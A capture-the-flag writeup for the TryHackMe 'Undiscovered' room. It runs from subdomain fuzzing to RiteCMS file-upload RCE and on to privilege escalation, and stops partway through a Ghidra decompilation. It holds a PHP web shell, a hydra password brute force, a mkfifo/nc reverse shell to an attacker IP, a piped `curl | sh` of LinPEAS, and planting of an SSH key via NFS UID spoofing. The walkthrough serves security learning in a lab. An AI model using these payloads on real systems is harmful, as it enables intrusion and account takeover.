# Undiscovered

## Introduction

Welcome to my another writeup! In this TryHackMe [Undiscovered](https://tryhackme.com/room/undiscoveredup) room, you'll learn: Subdomain enumeration, Remote Code Execution (RCE) via file upload and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold: File Upload Vulnerability](#initial-foothold)**
3. **[Privilege Escalation: www-data to william](#privilege-escalation)**
4. **[Privilege Escalation: william to leonard](#william-to-leonard)**
5. **[Privilege Escalation: leonard to root](#leonard-to-root)**
6. **[Conclusion](#conclusion)**

## Background

> Discovery consists not in seeking new landscapes, but in having new eyes..

> Difficulty: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# export RHOSTS=10.10.49.132
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c476814950bb6f4f0615cc088801b8f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0m4DmvKkWm3OoELtyKxq4G9yM29DEggmEsfKv2fzZh1G6EiPS/pKPQV/u8InqwPyyJZv82Apy4pVBYL7KJTTZkxBLbrJplJ6YnZD5xZMd8tf4uLw5ZCilO6oLDKH0pchPmQ2x2o5x2Xwbzfk4KRbwC+OZ4f1uCageOptlsR1ruM7boiHsPnDO3kCujsTU/4L19jJZMGmJZTpvRfcDIhelzFNxCMwMUwmlbvhiCf8nMwDaBER2HHP7DKXF95uSRJWKK9eiJNrk0h/K+3HkP2VXPtcnLwmbPhzVHDn68Dt8AyrO2d485j9mLusm4ufbrUXSyfM9JxYuL+LDrqgtUxxP
|   256 2b39d9d9b97227a93225dddee401ed8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAcr7A7L54JP/osGx6nvDs5y3weM4uwfT2iCJbU5HPdwGHERLCAazmr/ss6tELaj7eNqoB8LaM2AVAVVGQXBhc8=
|   256 2a38ceea6182ebdec4e02b557fcc13bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9WA55JtThufX7BcByUR5/JGKGYsIlgPxEiS0xqLlIA
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://undiscovered.thm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      35638/udp6  nlockmgr
|   100021  1,3,4      37851/tcp6  nlockmgr
|   100021  1,3,4      45828/tcp   nlockmgr
|   100021  1,3,4      59351/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      syn-ack ttl 63 2-4 (RPC #100003)
45828/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 5 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.2p2 Ubuntu
80                | Apache httpd 2.4.18
111               | RPCBind
2049,45828        | NFS

### NFS on Port 2049

**Show mounted share directory:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# showmount -e $RHOSTS         
clnt_create: RPC: Program not registered
```

Hmm... Nothing?

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# echo "$RHOSTS undiscovered.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231003449.png)

**It seems empty. Let's use `feroxbuster` to enumerate hidden directories and files:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# feroxbuster -u http://undiscovered.thm -w /usr/share/wordlists/dirb/big.txt -t 50 -x txt php html -o ferox.txt
[...]
200      GET       30l       48w      355c http://undiscovered.thm/index.php
[...]
```

**We can also use `ffuf` to fuzz subdomains:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://undiscovered.thm -H "Host: FUZZ.undiscovered.thm" -fw 18
[...]
manager                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 228ms]
dashboard               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 230ms]
deliver                 [Status: 200, Size: 4650, Words: 385, Lines: 83, Duration: 239ms]
newsite                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 228ms]
develop                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 227ms]
network                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 227ms]
forms                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 227ms]
maintenance             [Status: 200, Size: 4668, Words: 385, Lines: 69, Duration: 228ms]
view                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 227ms]
mailgate                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 228ms]
start                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 229ms]
play                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 229ms]
booking                 [Status: 200, Size: 4599, Words: 385, Lines: 84, Duration: 228ms]
terminal                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 228ms]
gold                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 228ms]
internet                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 228ms]
resources               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 228ms]
```

**Let's add them to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# nano /etc/hosts
10.10.49.132 undiscovered.thm manager.undiscovered.thm dashboard.undiscovered.thm deliver.undiscovered.thm newsite.undiscovered.thm develop.undiscovered.thm network.undiscovered.thm forms.undiscovered.thm maintenance.undiscovered.thm view.undiscovered.thm mailgate.undiscovered.thm play.undiscovered.thm start.undiscovered.thm booking.undiscovered.thm terminal.undiscovered.thm gold.undiscovered.thm internet.undiscovered.thm resources.undiscovered.thm
```

**manager.undiscovered.thm:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231005137.png)

**deliver.undiscovered.thm:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231005203.png)

**newsite.undiscovered.thm:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231005224.png)

**Hmm... In `http://undiscovered.thm/`, we saw:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231005323.png)

> The path should be the **darker** one...

**That means `deliver.undiscovered.thm` is the current path?**

**Also, that subdomain has a `favicon`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231005435.png)

Let's enumerate this subdomain!

## Initial Foothold

In the home page, we see **RiteCMS**, and it's version is **2.2.1**.

**Let's use `searchsploit` to search Exploit-DB offline exploits!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# searchsploit ritecms 2.2.1
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
RiteCMS 2.2.1 - Authenticated Remote Code Execution                  | php/webapps/48636.txt
RiteCMS 2.2.1 - Remote Code Execution (Authenticated)                | php/webapps/48915.py
--------------------------------------------------------------------- ---------------------------------
```

Looks like **this version of RiteCMS is vulnerable to Remote Code Execution (RCE)**. However, **it requires authentication**.

**Let's mirror `48636.txt`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# searchsploit -m 48636
```

**48636.txt:**
```
# Exploit Title: RiteCMS 2.2.1 - Authenticated Remote Code Execution
# Date: 2020-07-03
# Exploit Author: Enes Özeser
# Vendor Homepage: http://ritecms.com/
# Version: 2.2.1
# Tested on: Linux
# CVE: CVE-2020-23934

1- Go to following url. >> http://(HOST)/cms/
2- Default username and password is admin:admin. We must know login credentials.
3- Go to "Filemanager" and press "Upload file" button.
4- Choose your php web shell script and upload it.

PHP Web Shell Code == <?php system($_GET['cmd']); ?>

5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id

(( REQUEST ))

GET /media/(FILE-NAME).php?cmd=id HTTP/1.1
Host: (HOST)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://(HOST)/cms/index.php?mode=filemanager&directory=media
Connection: close
Cookie: icms[device_type]=desktop; icms[guest_date_log]=1593777486; PHPSESSID=mhuunvasd12cveo52fll3u
Upgrade-Insecure-Requests: 1


(( RESPONSE ))

HTTP/1.1 200 OK
Date: Fri, 06 Jul 2020 20:02:13 GMT
Server: Apache/2.4.43 (Debian)
Content-Length: 14
Connection: close
Content-Type: text/html; charset=UTF-8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**So, the exploit steps are:**

1. Login as `admin` in `http://(HOST)/cms/` (Default credentials are `admin:admin`)
2. **Upload PHP web shell in "Filemanager"**
3. Uploaded web shell will be at `http://(HOST)/media/(FILE-NAME).php`

Basically this is a very simple, basic **RCE via file upload**.

> If you want to learn more about file upload vulnerabilities, you can read my PortSwigger Lab ["File Upload Vulnerabilities" writeups](https://siunam321.github.io/ctf/#portswigger-labs).

**Now, let's go to `http://deliver.undiscovered.thm/cms/` and try default credentials:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010352.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010401.png)

Nope. It doesn't work.

**Let's use `hydra` to brute force `admin`'s password.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong"
[...]
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: {Redacted}
```

**Found RiteCMS `admin` password!**

**Let's login as user `admin`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010713.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010722.png)

**Then, we can go to "Filemanager" to upload our PHP web shell!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010841.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010850.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010907.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231010929.png)

**Next, create a one-liner PHP web shell:**
```php
<?php system($_GET["cmd"]); ?>
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# echo '<?php system($_GET["cmd"]); ?>' > webshell.php
```

**Upload it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231011214.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Undiscovered/images/Pasted%20image%2020221231011223.png)

**Now we have remote code execution in `/media/webshell.php`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# curl http://deliver.undiscovered.thm/media/webshell.php --get --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nice! Let's get a reverse shell:**

- Setup a listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# nc -lnvp 443
listening on [any] 443 ...
```

- Send the payload: (Generated from [revshells.com](https://www.revshells.com/))

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# curl http://deliver.undiscovered.thm/media/webshell.php --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.0.253 443 >/tmp/f"
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.49.132] 54288
bash: cannot set terminal process group (1260): Inappropriate ioctl for device
bash: no job control in this shell
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ whoami;hostname;id;ip a
<www/deliver.undiscovered.thm/media$ whoami;hostname;id;ip a                 
www-data
undiscovered
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:22:63:88:f2:3b brd ff:ff:ff:ff:ff:ff
    inet 10.10.49.132/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::22:63ff:fe88:f23b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `www-data`!

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/12/31 01:18:09 socat[38479] N opening character device "/dev/pts/2" for reading and writing
2022/12/31 01:18:09 socat[38479] N listening on AF=2 0.0.0.0:4444

www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/12/31 01:18:09 socat[38479] N opening character device "/dev/pts/2" for reading and writing
2022/12/31 01:18:09 socat[38479] N listening on AF=2 0.0.0.0:4444
                                                                 2022/12/31 01:18:28 socat[38479] N accepting connection from AF=2 10.10.49.132:51202 on AF=2 10.9.0.253:4444
                                                                  2022/12/31 01:18:28 socat[38479] N starting data transfer loop with FDs [5,5] and [7,7]
                                              www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ 
<www/deliver.undiscovered.thm/media$ export TERM=xterm-256color              
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ stty rows 23 columns 107
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ ^C
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ 
```

## Privilege Escalation

### www-data to william

Let's do some basic enumeration!

**SUID binaries:**
```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ find / -perm -4000 2>/dev/null
/bin/ping6
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/bin/mount
/sbin/mount.nfs
/usr/bin/chfn
/usr/bin/at
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
```

**System users:**
```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
william:x:3003:3003::/home/william:/bin/bash
leonard:x:1002:1002::/home/leonard:/bin/bash
```

```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ ls -lah /home
total 16K
drwxr-xr-x  4 root    root    4.0K Sep  4  2020 .
drwxr-xr-x 25 root    root    4.0K Sep  4  2020 ..
drwxr-x---  5 leonard leonard 4.0K Sep  9  2020 leonard
drwxr-x---  4 william william 4.0K Sep 10  2020 william
```

- Found 2 system users: `leonard` and `william`

**Found SQLite database file:**
```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/data$ file userdata 
userdata: SQLite 3.x database
```

**Let's transfer it:**
```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/data$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# wget http://$RHOSTS:8000/userdata
```

**Read all data from it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# sqlite3 userdata      
[...]
sqlite> .tables
rite_userdata

sqlite> PRAGMA table_info(rite_userdata);
0|id|INTEGER|0||1
1|name|varchar(255)|1|''|0
2|type|tinyint(4)|1|'0'|0
3|pw|varchar(255)|1|''|0
4|last_login|int(11)|1|'0'|0
5|wysiwyg|tinyint(4)|1|'0'|0

sqlite> SELECT * FROM rite_userdata;
1|admin|1|{Redacted}|1672466835|1
```

Nothing useful.

**Kernel version:**
```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/data$ uname -a;cat /etc/issue
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 16.04.7 LTS \n \l
```

**Capabilities:**
```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/data$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```

**The `/usr/bin/vim.basic` has set UID Capability!**
```
www-data@undiscovered:/var/www/deliver.undiscovered.thm/data$ ls -lah /usr/bin/vim.basic 
-rwxr-xr-- 1 root developer 2.4M Mar 19  2020 /usr/bin/vim.basic
```

But **it's owned by `root` and group `developer`.** So, `www-data` couldn't execute it.

**LinPEAS:**
```
┌──(root🌸siunam)-[/usr/share/peass/linpeas]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@undiscovered:/var/www/deliver.undiscovered.thm/data$ curl http://10.9.0.253/linpeas.sh | sh
[...]
╔══════════╣ All users & groups
[...]
uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
[...]
uid=3003(william) gid=3003(william) groups=3003(william)
[...]
╔══════════╣ Analyzing NFS Exports Files (limit 70)
-rw-r--r-- 1 root root 422 Sep  5  2020 /etc/exports
/home/william	*(rw,root_squash)
[...]
```

As you can see, user `leonard` has a group called `develoepr`.

Also, there is a NFS share mounted in `/home/william`.

**Hmm... Let's try to mount that NFS share:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# mkdir /mnt/share

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# mount -t nfs $RHOSTS:/home/william /mnt/share/

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# ls -lah /mnt/
[...]
drwxr-x---  4 nobody nogroup 4.0K Sep  9  2020 share
```

However, it's owned by `nobody` and `nogroup`.

To fix that, **we can add 2 new users, with the same UID in our attacker machine.**

**But first, let's `umount` that share:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# umount /mnt/share
```

**Then, add user `leonard` and `william`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# useradd -u 1002 leonard

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# useradd -u 3003 william
```

**Finally, `mount` the NFS share again:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# mount -t nfs $RHOSTS:/home/william /mnt/share/
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# ls -lah /mnt/
total 40K
drwxr-x---  4 william william 4.0K Sep  9  2020 share
```

**Now we can Switch User to `william` and access to the NFS share:**
```
┌──(root🌸siunam)-[/mnt]
└─# su william
$ /bin/bash
william@siunam:/mnt$ cd share/
william@siunam:/mnt/share$ ls -lah
total 44K
drwxr-x--- 4 william william 4.0K Sep  9  2020 .
drwxr-xr-x 3 root    root    4.0K Dec 31 02:06 ..
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 william william 3.7K Sep  4  2020 .bashrc
drwx------ 2 william william 4.0K Sep  4  2020 .cache
drwxrwxr-x 2 william william 4.0K Sep  4  2020 .nano
-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
-rwsrwsr-x 1 leonard leonard 8.6K Sep  4  2020 script
-rw-r----- 1 root    william   38 Sep  9  2020 user.txt
```

**user.txt:**
```
william@siunam:/mnt/share$ cat user.txt
THM{Redacted}
```

**Now, since we have write access to `/home/william` NFS share, we can write our own SSH public key into `/.ssh/authorized_keys`, then use our SSH private key to SSH into user `william`:** (This works because we're in `/home/william` directory, and we're user `william`, so we have permission to delete/add new files.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# mkdir .ssh;cd .ssh                              
                                                                                                           
┌──(root🌸siunam)-[~/…/thm/ctf/Undiscovered/.ssh]
└─# ssh-keygen                                       
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/ctf/thm/ctf/Undiscovered/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/ctf/thm/ctf/Undiscovered/.ssh/id_rsa
Your public key has been saved in /root/ctf/thm/ctf/Undiscovered/.ssh/id_rsa.pub

┌──(root🌸siunam)-[~/…/thm/ctf/Undiscovered/.ssh]
└─# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDF7aO1wyZwydGgxfueiPadMyZjdQy3D8KUEeyPssuzhfZyxGxyMYVgxtyIPVBYE4tkwEwG4chq0975qMzQZLHCOuvcbx2/yAUr5Eh4u+keRCCkKgQnE3tvoLn68ezNSLPpQ7qNZ4FOTw5b/Fw5s35WWblW69zb1Vi8IhUQWegrQadBzaNQ4bVQtptV3IcXUViqmkN0cyf0HmbpWGlGYA/XhKGwMrpYZakxzAklkrSxayzHBTYTqk4lYck4dPP9y5jEQhQEnIo1xoLRc10hd0M8iEvxrxa73XLyWlov2A5tulNS2+CbiuAsrqGGfsfFyJg5yMe3+pt6Gm4nZmwphOUUuGh7fRKhUiNNDwK1J+XYqNZgruBRKGtdSs55ixAr9UdUbEToHqsz7R58nqDMzJRTf46eZbSenAVBDeVcEADiudT8X9cnyI/Kt4FDnlpM7xrviLVIjjH6fi+VVJF7w6g/97xBrm210EsqIxq543RgsB79HwkMjxtroQHtY5wFEhs= root@siunam
```

```
william@siunam:/mnt/share$ mkdir .ssh;cd .ssh
william@siunam:/mnt/share/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDF7aO1wyZwydGgxfueiPadMyZjdQy3D8KUEeyPssuzhfZyxGxyMYVgxtyIPVBYE4tkwEwG4chq0975qMzQZLHCOuvcbx2/yAUr5Eh4u+keRCCkKgQnE3tvoLn68ezNSLPpQ7qNZ4FOTw5b/Fw5s35WWblW69zb1Vi8IhUQWegrQadBzaNQ4bVQtptV3IcXUViqmkN0cyf0HmbpWGlGYA/XhKGwMrpYZakxzAklkrSxayzHBTYTqk4lYck4dPP9y5jEQhQEnIo1xoLRc10hd0M8iEvxrxa73XLyWlov2A5tulNS2+CbiuAsrqGGfsfFyJg5yMe3+pt6Gm4nZmwphOUUuGh7fRKhUiNNDwK1J+XYqNZgruBRKGtdSs55ixAr9UdUbEToHqsz7R58nqDMzJRTf46eZbSenAVBDeVcEADiudT8X9cnyI/Kt4FDnlpM7xrviLVIjjH6fi+VVJF7w6g/97xBrm210EsqIxq543RgsB79HwkMjxtroQHtY5wFEhs= root@siunam' > authorized_keys
```

**SSH into `wiiliam`:**
```
┌──(root🌸siunam)-[~/…/thm/ctf/Undiscovered/.ssh]
└─# ssh -i id_rsa william@$RHOSTS
[...]
william@undiscovered:~$ whoami;hostname;id;ip a
william
undiscovered
uid=3003(william) gid=3003(william) groups=3003(william)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:22:63:88:f2:3b brd ff:ff:ff:ff:ff:ff
    inet 10.10.49.132/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::22:63ff:fe88:f23b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `william`!

### william to leonard

**In here, we see 2 interesting files: `admin.sh`, `script`.**
```
william@undiscovered:~$ ls -lah
total 52K
drwxr-x--- 5 william william 4.0K Dec 31 15:31 .
drwxr-xr-x 4 root    root    4.0K Sep  4  2020 ..
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 william william 3.7K Sep  4  2020 .bashrc
drwx------ 2 william william 4.0K Sep  4  2020 .cache
drwxrwxr-x 2 william william 4.0K Sep  4  2020 .nano
-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
-rwsrwsr-x 1 leonard leonard 8.6K Sep  4  2020 script
drwxr-xr-x 2 william william 4.0K Dec 31 15:31 .ssh
-rw-r----- 1 root    william   38 Sep 10  2020 user.txt
```

**admin.sh:**
```sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
```

**script:**
```
william@undiscovered:~$ file script 
script: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6e324a50ee883a60b395cdd1c6a64f96e6546736, not stripped
```

`script` is ELF 64-bit LSB executable, and **it has SUID sticky bit, which means we can execute that file as the file owner (`leonard`).**

**Let's use `strings` to list all the strings in that binary:**
```
william@undiscovered:~$ strings script
[...]
strcat
system
__libc_start_main
__gmon_start__
GLIBC_2.2.5
GLIBC_2.4
UH-P
/bin/catH
 /home/lH
eonard/
[...]
./admin.sh
[...]
```

**Looks like it's running `/bin/cat ./admin.sh`?**
```
william@undiscovered:~$ ./script 
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
```

**Let's reverse enigineering it via `ghidra`:**
```
william@undiscovered:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# wget http://$RHOSTS:8000/script

┌──(root🌸siunam)-[~/ctf/thm/ctf/Undiscovered]
└─# ghidra
```

**Function `main()`:**
```c
undefined8 main(undefined8 param_1,long param_2)

{
  long in_FS_OFFSET;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (*(long *)(param_2 + 8) == 0) {
    system("./admin.sh");
  }
  else {
    setreuid(0x3ea,0x3ea);
    local_78 = 0x7461632f6e69622f;
    local_70 = 0x6c2f656d6f682f20;
    local_68 = 0x2f6472616e6f65;
    strcat((char *)&local_78,*(char **)(param_2 + 8));
    system((char *)&local_78);
  }
